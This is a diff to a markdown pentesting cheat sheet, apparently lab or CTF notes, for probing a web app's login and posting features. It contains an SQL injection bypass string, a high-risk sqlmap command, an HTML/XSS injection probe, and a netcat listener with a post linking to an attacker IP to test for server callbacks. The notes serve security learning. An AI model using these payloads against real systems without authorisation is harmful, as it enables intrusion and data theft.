@@ -45,10 +45,33 @@ admin:' or 1=1;--
 ```bash
 sqlmap -r login.req --batch --dbs --level=3 --risk=3
 ```
-### Forgot Password
-See if you can validate email addresses.
+> [!NOTE] 
+> Cross Site Request Forgery (CSRF) Tokens are unique for each session/request and are validated server-side. This makes it hard for sqlmap to work properly.
+
+
 > [!Caution]
 > Running a high risk factor could negatively impact the server
+### Forgot Password
+See if you can validate email addresses.
+### Sign Up 
+Try to sign up for a new account
+
+## Posts
+### Cross-Site Scripting 
+Attempt to Bold Text
+```form
+<b>TITLE/USERNAME</b>
+```
+### Check Connection
+Set up Listener on Attacking Machine
+```bash
+sudo nc -lvnp 80
+```
+In Post
+```form
+http://<ATTACKING_IP>/
+```
+Take note User-Agent (ex. Curl)
 ## Searchsploit
 Search for CMS exploits with similar version numbers 
 > [!NOTE]
